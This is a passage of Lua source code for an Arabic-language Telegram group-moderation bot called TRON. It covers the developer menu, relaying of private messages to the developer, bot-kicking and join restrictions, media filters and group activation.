DevAbd:del(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAbd == "مدير" and Manager(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevAbd:srem(TRON..'Abd:Managers:'..msg.chat_id_, result.id_)
DevAbd:del(TRON.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrAbd == "عضو" then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'YYYYAX')..')'..' ❩\n⌁︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
else
Dev_Abd(msg.chat_id_, msg.id_, 1, "⌁︙*المعرف غير صحيح*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source TRON     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevAbd:incr(TRON..'Abd:UsersMsgs'..TRON..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbd:incr(TRON..'Abd:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbd:incr(TRON..'Abd:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevAbd:sismember(TRON.."Abd:Users",msg.chat_id_) then
DevAbd:sadd(TRON.."Abd:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     Source TRON     --
if ChatType == 'pv' then 
if text == '/start' or text == 'رجوع ،🔙‘' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌁︙مرحبا عزيزي المطور \n⌁︙انت المطور الاساسي هنا \n⌁︙اليك ازرار سورس ترون \n⌁︙تستطيع التحكم بكل الاوامر فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'وضع اسم البوت','↫ تحديث ⌁','وضع كليشه المطور'},
{'↫ المطورين ⌁','↫ الاحصائيات ⌁'},
{'↫ المجموعات ⌁','روابط الكروبات','↫ المشتركين ⌁'},
{'↫ تعطيل التواصل ⌁','↫ تفعيل التواصل ⌁'},
{'تنظيف الكروبات','↫ قائمه العام ⌁','تنظيف المشتركين'},
{'↫ تغير المطور الاساسي ⌁'},
{'تعطيل ترحيب البوت','تفعيل ترحيب البوت'},
{'↫ تغير معلومات الترحيب ⌁'},
{'↫ تعطيل المغادره ⌁','↫ تفعيل المغادره ⌁'},
{'↫ تعطيل الاذاعه ⌁','↫ تفعيل الاذاعه ⌁'},
{'↫ اذاعه بالتثبيت ⌁'},
{'↫ اذاعه عام ⌁','↫ اذاعه خاص ⌁'},
{'↫ اذاعه عام بالتوجيه ⌁','↫ اذاعه خاص بالتوجيه ⌁'},
{'~ تعيين كلايش الاوامر ~'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'جلب نسخه السورس','تحديث السورس','جلب نسخه الكروبات'},
{'↫ حذف رد عام ⌁','↫ الردود العام ⌁','↫ اضف رد عام ⌁'},
{'↫ حذف رد الخاص ⌁','↫ تعيين رد الخاص ⌁'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغير كليشه الاشتراك'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '~ تعيين كلايش الاوامر ~' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '⌁︙اهلا بك مجددا عزيزي المطور \n⌁︙اليك الازرار الخاصه بتعديل وتغيير كلايش سورس ترون فقط اضغط على الامر الذي تريد تنفيذه'
local key = {
{'حذف كليشة الايدي','تعيين كليشة الايدي'},
{'تعيين امر الاوامر'},
{'تعيين امر م3','تعيين امر م2','تعيين امر م1'},
{'تعيين امر م6','تعيين امر م5','تعيين امر م4'},
{'استعادة كلايش الاوامر'},
{'رجوع ،🔙‘'},
}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == '/start' and ChCheck(msg) then  
if not DevAbd:get(TRON..'Abd:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=TRON},function(arg,dp) 
local inline = {{{text="⌁ اضفني في مجموعتك ⌁",url="t.me/"..dp.username_.."?startgroup=botstart"}}}
local start = DevAbd:get(TRON.."Abd:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
SendInline(msg.chat_id_,Start_Source,nil,inline)
end,nil)
end
DevAbd:setex(TRON..'Abd:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source TRON     --
if not SecondSudo(msg) and not DevAbd:sismember(TRON..'Abd:Ban:Pv',msg.sender_user_id_) and not DevAbd:get(TRON..'Abd:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_Abd(msg.sender_user_id_, msg.id_, 1, '⌁︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "YYYYAX")..')', 1, 'md') 
tdcli_function({ID="ForwardMessages",chat_id_=DevId,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
SendText(DevId,'⌁︙تم ارسال الملصق من ↫ ⤈\n['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end
if SecondSudo(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end 
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' or text == 'حضر' then
local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbd:sadd(TRON..'Abd:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '⌁︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n⌁︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevAbd:srem(TRON..'Abd:Ban:Pv',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,dp) 
if dp.code_ == 400 or dp.code_ == 5 then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙العضو قام بحظر البوت لا تستطيع ارسال الرسائل له', 1, 'md')
return false  
end 
if text then
Dev_Abd(id_user, 0, 1, text, 1, "md")  
Text = '⌁︙تم ارسال الرساله الى ↫ ⤈'
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1,nil, msg.content_.sticker_.sticker_.persistent_id_)   
Text = '⌁︙تم ارسال الملصق الى ↫ ⤈'
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1,nil, msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = '⌁︙تم ارسال الصوره الى ↫ ⤈'
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
Text = '⌁︙تم ارسال المتحركه الى ↫ ⤈'
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1,nil, msg.content_.voice_.voice_.persistent_id_)    
Text = '⌁︙تم ارسال البصمه الى ↫ ⤈'
end     
SendText(DevId, Text..'\n'..'['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);
end,nil);
end,nil);
end,nil);
end 
end 
--     Source TRON     --
if text and DevAbd:get(TRON..'Abd:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevAbd:del(TRON..'Abd:Start:Bots'..msg.sender_user_id_) 
return false
end
DevAbd:set(TRON.."Abd:Start:Bot",text)  
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الستارت', 1, 'md')
DevAbd:del(TRON..'Abd:Start:Bots'..msg.sender_user_id_) 
return false
end
if SecondSudo(msg) then
if text == 'تعيين رد الخاص' or text == 'ضع كليشه ستارت' or text == '↫ تعيين رد الخاص ⌁' then 
DevAbd:set(TRON..'Abd:Start:Bots'..msg.sender_user_id_,true) 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي كليشة الستارت الان', 1, 'md')
return false
end
if text == 'حذف رد الخاص' or text == 'حذف كليشه ستارت' or text == '↫ حذف رد الخاص ⌁' then 
DevAbd:del(TRON..'Start:Bot') 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف كليشة الستارت بنجاح', 1, 'md')
end
if text == 'جلب رد الخاص' then  
local start = DevAbd:get(TRON.."Abd:Start:Bot")
if start then 
Start_Source = start
else
Start_Source = "⌁︙مرحبا انا بوت اسمي "..NameBot.."\n⌁︙اختصاصي حماية المجموعات\n⌁︙من التفليش والسبام والخخ .. . ،\n⌁︙تفعيلي سهل ومجانا فقط قم برفعي ادمن في مجموعتك وارسل امر ↫ تفعيل\n⌁︙سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
Dev_Abd(msg.chat_id_, msg.id_, 1, Start_Source, 1, 'md')
return false
end
if text == 'تفعيل التواصل' or text == '↫ تفعيل التواصل ⌁' then   
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تفعيل التواصل بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:del(TRON..'Abd:Texting:Pv') 
end
if text == 'تعطيل التواصل' or text == '↫ تعطيل التواصل ⌁' then  
local TRONTEAM = '⌁︙اهلا عزيزي ↫ '..AbdRank(msg)..' \n⌁︙تم تعطيل التواصل بنجاح'
Abdmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TRONTEAM, 14, string.len(msg.sender_user_id_))
DevAbd:set(TRON..'Abd:Texting:Pv',true) 
end
end
--     Source TRON     --
function getUser(user_id, cb)
tdcli_function ({
ID = "GetUser",
user_id_ = user_id
}, cb, nil)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then 
DevAbd:incr(TRON..'Abd:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbd:set(TRON.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevAbd:get(TRON.."Abd:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "kick" and not VipMem(msg) then   
https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "del" and not VipMem(msg) then   
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and Bots == "ked" and not VipMem(msg) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp) local admins = dp.members_ for i=0 , #admins do if dp.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not VipMem(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(TRON) then 
DevAbd:srem(TRON.."Abd:Groups", msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Sudo(msg) and not Bot(msg) then
SendText(DevId,"⌁︙تم طرد البوت من المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAbd:get(TRON..'Abd:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevAbd:incr(TRON..'Abd:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevAbd:incr(TRON..'Abd:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source TRON     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevAbd:get(TRON..'Abd:Lock:FreeBot'..TRON) then
if ChatType == 'pv' then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,ChatMem) 
if ChatMem and ChatMem.status_.ID == "ChatMemberStatusEditor" or ChatMem and ChatMem.status_.ID == "ChatMemberStatusCreator" then
if ChatMem and ChatMem.user_id_ == msg.sender_user_id_ then
if ChatMem.status_.ID == "ChatMemberStatusCreator" then
status = 'منشئ'
elseif ChatMem.status_.ID == "ChatMemberStatusEditor" then
status = 'ادمن'
else 
status = 'عضو'
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbd:srem(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevAbd:sadd(TRON..'Abd:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAbd:sadd(TRON.."Abd:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbd:sadd(TRON.."Abd:AbdConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbd:srem(TRON.."Abd:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevAbd:srem(TRON.."Abd:AbdConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAbd:sismember(TRON..'Abd:Groups',msg.chat_id_) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevAbd:get(TRON..'Abd:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevAbd:get(TRON..'Abd:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تفعيل المجموعه "..dp.title_)  
DevAbd:sadd(TRON.."Abd:Groups",msg.chat_id_)
DevAbd:sadd(TRON..'Abd:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevAbd:set(TRON.."Abd:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙موقعه في المجموعه ↫ "..status.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end end
end,nil)
end,nil)
end,nil)
end,nil)
else
Dev_Abd(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تفعيل هذه المجموعه بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source TRON     --
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source TRON     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevAbd:set(TRON..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source TRON     --
local ReFalse = tostring(msg.chat_id_)
if not DevAbd:sismember(TRON.."Abd:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
print("Return False : The Bot Is Not Enabled In The Group")
return false
end
--     Source TRON     --
-------- MSG TYPES ---------
if msg.content_.ID == "MessageChatJoinByLink" and not VipMem(msg) then 
if DevAbd:get(TRON..'Abd:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevAbd:sadd(TRON..'Abd:Tkeed:'..msg.chat_id_, dp.id_)
local Text = '⌁︙اهلا عزيزي ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n⌁︙يجب علينا التأكد أنك لست روبوت\n⌁︙تم تقيدك اضغط الزر بالاسفل لفكه'
keyboard = {} 
keyboard.inline_keyboard = {{{text="اضغط هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevAbd:get(TRON.."Abd:Lock:Join"..msg.chat_id_) then
ChatKick(msg.chat_id_,msg.sender_user_id_) 
return false  
end
end
if msg.content_.ID == "MessagePhoto" then
if not Manager(msg) then 
local filter = DevAbd:smembers(TRON.."Abd:FilterPhoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الصوره التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
if msg.content_.ID == "MessageAnimation" then
if not Manager(msg) then 
local filter = DevAbd:smembers(TRON.."Abd:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙المتحركه التي ارسلتها تم منعها من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
end
if msg.content_.ID == "MessageSticker" then
if not Manager(msg) then 
local filter = DevAbd:smembers(TRON.."Abd:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.sticker_.persistent_id_ then
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙الملصق الذي ارسلته تم منعه من المجموعه")  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
end
end
end
end
--     Source TRON     --
if text and text:match("^(.*)$") then
local DelGpRedRedods = DevAbd:get(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevAbd:get(TRON..'Abd:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevAbd:del(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbd:srem(TRON..'Abd:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAbd:get(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
DevAbd:del(TRON..'Abd:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevAbd:del(TRON..'Abd:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevAbd:srem(TRON..'Abd:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevAbd:get(TRON..'Abd:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Abd(msg.chat_id_, msg.id_, 1,'⌁︙الكلمه ↫ '..msg.content_.text_..' تم حذفها',  1, "html")
